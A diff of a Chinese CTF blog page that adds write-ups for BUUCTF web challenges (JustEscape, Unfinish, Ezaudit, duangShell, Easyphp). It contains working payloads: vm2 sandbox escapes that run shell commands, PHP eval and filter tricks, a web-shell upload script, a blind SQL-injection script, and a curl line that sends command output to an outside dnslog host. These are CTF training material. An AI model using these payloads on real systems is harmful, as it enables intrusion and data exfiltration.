@@ -481,21 +481,21 @@ function get_the_flag()&amp;#123;
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-13
+                    2022-03-28
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    4.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    26 分
                 </div>
                 
 
@@ -561,7 +561,7 @@ eval($hhh);
 <p>但是有个非预期解，利用eval函数查看phpinfo就能找到flag</p>
 <pre class="language-none"><code class="language-none">_&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</code></pre>
 
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220119190933261.png" alt="image-20220119190933261"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119190933261.png" alt="image-20220119190933261"></p>
 <p><strong>预期解：</strong></p>
 <p>首先利用eval来执行get_the_flag函数</p>
 <pre class="language-none"><code class="language-none">_&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;;&amp;%ff&#x3D;get_the_flag</code></pre>
@@ -611,19 +611,19 @@ files &#x3D; &#123;&#39;file&#39;:(&#39;shell.sss&#39;,shell,&#39;image&#x2F;jpe
 response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files)
 print(response.text)</code></pre>
 
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220119194212595.png" alt="image-20220119194212595"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119194212595.png" alt="image-20220119194212595"></p>
 <p>得到路径之后蚁剑连一下</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220119194354577.png" alt="image-20220119194354577"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119194354577.png" alt="image-20220119194354577"></p>
 <p>根目录下</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220119194520905.png" alt="image-20220119194520905"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119194520905.png" alt="image-20220119194520905"></p>
 <p>？？为什么我能直接读，百度的wp都是还要绕过open_basedir的</p>
 <p><a target="_blank" rel="noopener" href="https://www.e-learn.cn/topic/3627394">浅谈几种Bypass open_basedir的方法 | 易学教程 (e-learn.cn)</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720">bypass open_basedir的新方法 - 先知社区 (aliyun.com)</a></p>
-<h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220120110108160.png" alt="image-20220120110108160"></p>
+<h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120110108160.png" alt="image-20220120110108160"></p>
 <p>抓包，把给的hash值利用get传进去</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220120110154642.png" alt="image-20220120110154642"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220120110154642.png" alt="image-20220120110154642"></p>
 <p>看一下flflflflag.php</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220120110245508.png" alt="image-20220120110245508"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120110245508.png" alt="image-20220120110245508"></p>
 <p>利用伪协议读一下源码</p>
 <p>file=php://filter/convert.base64-encode/resource=flflflflag.php</p>
 <p>得到</p>
@@ -671,9 +671,9 @@ if(md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass)&#123;
 <p>这道题是要利用php临时文件来写马，找到phpinfo里的flag</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/11278477.html">PHP临时文件机制与利用的思考 - linuxsec - 博客园 (cnblogs.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11301743.html">关于php文件操作的几个小trick - tr1ple - 博客园 (cnblogs.com)</a></p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220120114000050.png" alt="image-20220120114000050"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120114000050.png" alt="image-20220120114000050"></p>
 <p>临时文件的默认存储位置在tmp目录下，扫目录扫出的dir.php显示了tmp目录下的文件</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220120115533341.png" alt="image-20220120115533341"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120115533341.png" alt="image-20220120115533341"></p>
 <p>dir.php</p>
 <pre class="language-none"><code class="language-none">&lt;?php
 var_dump(scandir(&#39;&#x2F;tmp&#39;));
@@ -692,9 +692,456 @@ r&#x3D;requests.post(url&#x3D;url,files&#x3D;files,allow_redirects&#x3D;False)&#
 print(r.text)</code></pre>
 
 <p>可以看到上传成功</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220120122305671.png" alt="image-20220120122305671"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120122305671.png" alt="image-20220120122305671"></p>
 <p>得到flag</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220120122643975.png" alt="image-20220120122643975"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120122643975.png" alt="image-20220120122643975"></p>
+<h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303201348464.png" alt="image-20220303201348464"></p>
+<p>访问一下run.php</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303201424600.png" alt="image-20220303201424600"></p>
+<p>刚开始以为是php的代码执行，但是试了试没啥反应</p>
+<p>然后发现考点是js的vm2逃逸</p>
+<p>先用Error().stack看看（js中捕获异常堆栈信息</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303201707379.png" alt="image-20220303201707379"></p>
+<p>然后找一下vm2逃逸的payload</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues/225">Breakout in v3.8.3 · Issue #225 · patriksimek/vm2 (github.com)</a></p>
+<pre class="language-none"><code class="language-none">try &#123;
+    Buffer.from(new Proxy(&#123;&#125;, &#123;
+        getOwnPropertyDescriptor()&#123;
+            throw f&#x3D;&gt;f[&#96;&#96;.concat(&#96;constr&#96;,&#96;uctor&#96;)](&#96;&#96;.concat(&#96;return pro&#96;,&#96;cess&#96;))();
+        &#125;
+    &#125;));
+&#125; catch(e) &#123;
+    e(()&#x3D;&gt;&#123;&#125;).mainModule.require(&#96;&#96;.concat(&#96;child_proc&#96;,&#96;ess&#96;))
+        [&#96;&#96;.concat(&#96;ex&#96;,&#96;ecSync&#96;)](&#96;cat package.json&#96;)
+&#125;</code></pre>
+
+<p>或</p>
+<pre class="language-none"><code class="language-none"> &#39;(&#39; + function()&#123;
+	TypeError.prototype.get_process &#x3D; f&#x3D;&gt;f.constructor(&quot;return process&quot;)();
+	try&#123;
+		Object.preventExtensions(Buffer.from(&quot;&quot;)).a &#x3D; 1;
+	&#125;catch(e)&#123;
+		return e.get_process(()&#x3D;&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();
+	&#125;
+&#125;+&#39;)()&#39;;
+try&#123;
+	console.log(new VM().run(untrusted));
+&#125;catch(x)&#123;
+	console.log(x);
+&#125;</code></pre>
+
+<p>但是直接利用有waf</p>
+<p>[&#39;for&#39;, &#39;while&#39;, &#39;process&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;+&#39;, &#39;&quot;&#39;,&#39;&#39;&#39;]</p>
+<p>所以通过在关键字字母上加上 ` 进行绕过</p>
+<pre class="language-none"><code class="language-none">&#x2F;run.php?code&#x3D;(()&#x3D;%3E&#123;%20TypeError[[&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;t&#96;,&#96;o&#96;,&#96;t&#96;,&#96;y&#96;,&#96;p&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)][&#96;a&#96;]%20&#x3D;%20f&#x3D;%3Ef[[&#96;c&#96;,&#96;o&#96;,&#96;n&#96;,&#96;s&#96;,&#96;t&#96;,&#96;r&#96;,&#96;u&#96;,&#96;c&#96;,&#96;t&#96;,&#96;o&#96;,&#96;r&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;r&#96;,&#96;e&#96;,&#96;t&#96;,&#96;u&#96;,&#96;r&#96;,&#96;n&#96;,&#96;%20&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))();%20try&#123;%20Object[&#96;preventExtensions&#96;](Buffer[&#96;from&#96;](&#96;&#96;))[&#96;a&#96;]%20&#x3D;%201;%20&#125;catch(e)&#123;%20return%20e[&#96;a&#96;](()&#x3D;%3E&#123;&#125;)[&#96;mainModule&#96;][[&#96;r&#96;,&#96;e&#96;,&#96;q&#96;,&#96;u&#96;,&#96;i&#96;,&#96;r&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;c&#96;,&#96;h&#96;,&#96;i&#96;,&#96;l&#96;,&#96;d&#96;,&#96;_&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))[[&#96;e&#96;,&#96;x&#96;,&#96;e&#96;,&#96;c&#96;,&#96;S&#96;,&#96;y&#96;,&#96;n&#96;,&#96;c&#96;][&#96;join&#96;](&#96;&#96;)](&#96;cat+%2fflag&#96;)[&#96;toString&#96;]();%20&#125;%20&#125;)()
+</code></pre>
+
+<p>join的作用：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303203448082.png" alt="image-20220303203448082"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303203626377.png" alt="image-20220303203626377"></p>
+<p>还有另一种绕过方式</p>
+<pre class="language-jsx" data-language="jsx"><code class="language-jsx">&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;</code></pre>
+
+<p>把所有被过滤的字符按这个方式改写就行</p>
+<pre class="language-none"><code class="language-none">(function ()&#123;
+    TypeError[&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;] &#x3D; f&#x3D;&gt;f[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;return this.proces&#96;&#125;s&#96;&#125;&#96;)();
+    try&#123;
+        Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1;
+    &#125;catch(e)&#123;
+        return e[&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;](()&#x3D;&gt;&#123;&#125;).mainModule[&#96;$&#123;&#96;$&#123;&#96;requir&#96;&#125;e&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;child_proces&#96;&#125;s&#96;&#125;&#96;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#96;cat &#x2F;flag&#96;).toString();
+    &#125;
+&#125;)()</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303204954125.png" alt="image-20220303204954125"></p>
+<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>进入之后是login.php界面，有login那肯定也有register.php，访问一下然后注册个用户，再登录</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303215431763.png" alt="image-20220303215431763"></p>
+<p>整个页面除了这个用户名其他没有任何有用的地方，于是猜测是二次注入</p>
+<p>information，逗号都被过滤了</p>
+<p>只能用from for代替逗号，之间猜表名是flag</p>
+<p>确定之后写脚本跑flag</p>
+<pre class="language-python" data-language="python"><code class="language-python">import re
+from time import sleep
+import requests
+flag &#x3D; &#39;&#39;
+url &#x3D; &#39;http:&#x2F;&#x2F;a5568bf9-7958-451d-8e61-3e7dc9fa8556.node4.buuoj.cn:81&#x2F;&#39;
+payload &#x3D; &#39;0+ascii(substr((select * from flag) from &#123;&#125; for 1))&#39;
+for i in range(1000):
+    sleep(0.3)
+    data &#x3D; &#123;&quot;email&quot;: &quot;1234&#123;&#125;@123.com&quot;.format(i),
+            &quot;username&quot;: &quot;0&#39;+ascii(substr((select * from flag) from &#123;&#125; for 1))--+&quot;.format(i), &quot;password&quot;: &quot;123&quot;&#125;
+    data1 &#x3D; &#123;&quot;email&quot;: &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;password&quot;: &quot;123&quot;&#125;
+    requests.post(url&#x3D;url + &#39;register.php&#39;, data&#x3D;data)
+
+    r2 &#x3D; requests.post(url&#x3D;url + &#39;login.php&#39;, data&#x3D;data1)
+    res &#x3D; re.search(r&#39;&lt;span class&#x3D;&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;&#x2F;span&gt;&#39;, r2.text)
+    res1 &#x3D; re.search(r&#39;\d+&#39;, res.group())
+    flag &#x3D; flag + chr(int(res1.group()))
+    print(flag)
+</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303215646816.png" alt="image-20220303215646816"></p>
+<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>写脚本执行运算就行</p>
+<pre class="language-none"><code class="language-none">import re
+import requests
+from time import sleep
+
+#
+url &#x3D; &#39;http:&#x2F;&#x2F;e7e29bd6-320e-4016-b8be-63f714c813ec.node4.buuoj.cn:81&#x2F;index.php&#39;
+req &#x3D; requests.session()
+response &#x3D; req.get(url)
+for i in range(1001):
+    math &#x3D; re.search(r&#39;[0-9]+ [+|-] [0-9]+&#39;, response.text)
+    data &#x3D; &#123;&quot;answer&quot; : eval(math.group())&#125;
+    response &#x3D; req.post(url, data&#x3D;data)
+    print(i,data)
+    response.encoding &#x3D; &quot;utf-8&quot;
+    print(response.text)
+    sleep(0.1)</code></pre>
+
+<p>唯一要注意的就是要先用request.session()保持会话</p>
+<h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>php的伪随机，和前边一道题很像</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306160421431.png" alt="image-20220306160421431"></p>
+<p>看到<a target="_blank" rel="noopener" href="http://www.zip,下载下来看看源码/">www.zip，下载下来看看源码</a></p>
+<pre class="language-none"><code class="language-none">if(isset($_POST[&#39;login&#39;]))&#123;
+    $username &#x3D; $_POST[&#39;username&#39;];
+    $password &#x3D; $_POST[&#39;password&#39;];
+    $Private_key &#x3D; $_POST[&#39;Private_key&#39;];
+    if (($username &#x3D;&#x3D; &#39;&#39;) || ($password &#x3D;&#x3D; &#39;&#39;) ||($Private_key &#x3D;&#x3D; &#39;&#39;)) &#123;
+        &#x2F;&#x2F; 若为空,视为未填写,提示错误,并3秒后返回登录界面
+        header(&#39;refresh:2; url&#x3D;login.html&#39;);
+        echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;;
+        exit;
+    &#125;
+    else if($Private_key !&#x3D; &#39;*************&#39; )
+    &#123;
+        header(&#39;refresh:2; url&#x3D;login.html&#39;);
+        echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;;
+        exit;
+    &#125;
+
+    else&#123;
+        if($Private_key &#x3D;&#x3D;&#x3D; &#39;************&#39;)&#123;
+            $getuser &#x3D; &quot;SELECT flag FROM user WHERE username&#x3D; &#39;crispr&#39; AND password &#x3D; &#39;$password&#39;&quot;.&#39;;&#39;;
+            $link&#x3D;mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);
+            mysql_select_db(&quot;test&quot;,$link);
+            $result &#x3D; mysql_query($getuser);
+            while($row&#x3D;mysql_fetch_assoc($result))&#123;
+                echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;;
+            &#125;
+        &#125;
+    &#125;
+
+&#125;
+&#x2F;&#x2F; genarate public_key
+function public_key($length &#x3D; 16) &#123;
+    $strings1 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
+    $public_key &#x3D; &#39;&#39;;
+    for ( $i &#x3D; 0; $i &lt; $length; $i++ )
+        $public_key .&#x3D; substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
+    return $public_key;
+&#125;
+
+&#x2F;&#x2F;genarate private_key
+function private_key($length &#x3D; 12) &#123;
+    $strings2 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
+    $private_key &#x3D; &#39;&#39;;
+    for ( $i &#x3D; 0; $i &lt; $length; $i++ )
+        $private_key .&#x3D; substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
+    return $private_key;
+&#125;
+$Public_key &#x3D; public_key();
+&#x2F;&#x2F;$Public_key &#x3D; KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???</code></pre>
+
+<p>给了一个公钥，我们来试试求私钥</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306160642065.png" alt="image-20220306160642065"></p>
+<p>两个脚本用那个都行，把输出的结果放到php_mt_seed里求求种子</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306160739487.png" alt="image-20220306160739487"></p>
+<p>得到种子之后就能得到私钥的值了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306161532376.png" alt="image-20220306161532376"></p>
+<p>对于密码这部分可以直接用万能密码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306161558813.png" alt="image-20220306161558813"></p>
+<p>登录拿到flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306161615805.png" alt="image-20220306161615805"></p>
+<h2 id="网鼎杯-track-hacker"><a href="#网鼎杯-track-hacker" class="headerlink" title="[网鼎杯]track_hacker"></a>[网鼎杯]track_hacker</h2><p>不是buu的题，也没啥难度，就是记录一下这种解码的方式</p>
+<p>用python2解码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313151128218.png" alt="image-20220313151128218"></p>
+<p>如果用python3要用这种写法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313151354257.png" alt="image-20220313151354257"></p>
+<h2 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h2><p>主要是记录一下利用dnslog外带的方法</p>
+<pre class="language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
+&lt;html lang&#x3D;&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
+    &lt;title&gt;give me a girl&lt;&#x2F;title&gt;
+&lt;&#x2F;head&gt;
+&lt;body&gt;
+    &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;
+&lt;?php
+error_reporting(0);
+echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;
+if (!isset($_POST[&#39;girl_friend&#39;])) &#123;
+    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);
+&#125; else &#123;
+    $girl &#x3D; $_POST[&#39;girl_friend&#39;];
+    if (preg_match(&#39;&#x2F;\&gt;|\\\&#x2F;&#39;, $girl)) &#123;
+        die(&#39;just girl&#39;);
+    &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$&#x2F;i&#39;, $girl)) &#123;
+        echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;
+    &#125; else &#123;
+        &#x2F;&#x2F;duangShell~~~~
+        exec($girl);
+    &#125;
+&#125;</code></pre>
+
+<p>可以看到post的girl_friend值绕过过滤之后直接命令执行，但是这里是exec不存在回显，所以可以进行反弹shell，或者利用dnslog外带命令</p>
+<p><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a></p>
+<pre class="language-none"><code class="language-none">curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;&#96;反引号内执行命令&#96;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313181954261.png" alt="image-20220313181954261"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313183153676.png" alt="image-20220313183153676"></p>
+<p>既然能执行命令，那我们就可以用find找flag文件名然后查看，或者直接grep找内容，但是如果从根目录开始找buu的靶机好像跑不动，会显示超时</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313182203224.png" alt="image-20220313182203224"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313183232302.png" alt="image-20220313183232302"></p>
+<p>或者用grep直接带出flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313182614407.png" alt="image-20220313182614407"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313183120462.png" alt="image-20220313183120462"></p>
+<p>注意的是这种外带一次只能显示一条数据，所以可能会匹配到其他的文件，如果想查看其他数据，就要利用sed命令</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313182834749.png" alt="image-20220313182834749"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313183347193.png" alt="image-20220313183347193"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313182858820.png" alt="image-20220313182858820"></p>
+<h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p>在update界面，即使没有成功登录也会继续执行下面的调用update方法的语句</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220317214149049.png" alt="image-20220317214149049"></p>
+<p>重点在lib.php中，这里面有两个__destruct方法，我们要利用的是UpdateHelper类中的__destruct,这是我们反序列化的起点</p>
+<p>但是我们先来看看dbCtrl类</p>
+<pre class="language-none"><code class="language-none">class dbCtrl
+&#123;
+    public $hostname&#x3D;&quot;127.0.0.1&quot;;
+    public $dbuser&#x3D;&quot;root&quot;;
+    public $dbpass&#x3D;&quot;root&quot;;
+    public $database&#x3D;&quot;test&quot;;
+    public $name;
+    public $password;
+    public $mysqli;
+    public $token;
+    public function __construct()
+    &#123;
+        $this-&gt;name&#x3D;$_POST[&#39;username&#39;];
+        $this-&gt;password&#x3D;$_POST[&#39;password&#39;];
+        $this-&gt;token&#x3D;$_SESSION[&#39;token&#39;];
+    &#125;
+    public function login($sql)
+    &#123;
+        $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);
+        if ($this-&gt;mysqli-&gt;connect_error) &#123;
+            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);
+        &#125;
+        $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);
+        $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);
+        $result-&gt;execute();
+        $result-&gt;bind_result($idResult, $passwordResult);
+        $result-&gt;fetch();
+        $result-&gt;close();
+        if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123;
+            return $idResult;
+        &#125;
+        if (!$idResult) &#123;
+            echo(&#39;用户不存在!&#39;);
+            return false;
+        &#125;
